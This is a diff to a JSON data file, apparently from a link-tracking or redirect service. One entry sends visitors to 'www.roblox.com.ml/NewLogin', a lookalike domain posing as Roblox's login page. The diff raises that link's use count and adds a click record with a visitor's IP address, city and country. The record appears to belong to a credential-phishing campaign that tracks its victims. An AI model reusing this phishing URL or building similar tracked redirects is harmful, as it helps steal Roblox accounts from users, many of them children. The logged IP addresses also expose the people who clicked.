@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 556,
+    "useCount": 557,
     "createdBy": "admin",
     "clicks": [
       {
@@ -4560,6 +4560,14 @@
         "city": "Vranov nad Topľou",
         "flag": "🇸🇰",
         "countryCode": "SK"
+      },
+      {
+        "timestamp": 1777099551143,
+        "ip": "179.60.68.147",
+        "country": "Chile",
+        "city": "Santiago",
+        "flag": "🇨🇱",
+        "countryCode": "CL"
       }
     ]
   },
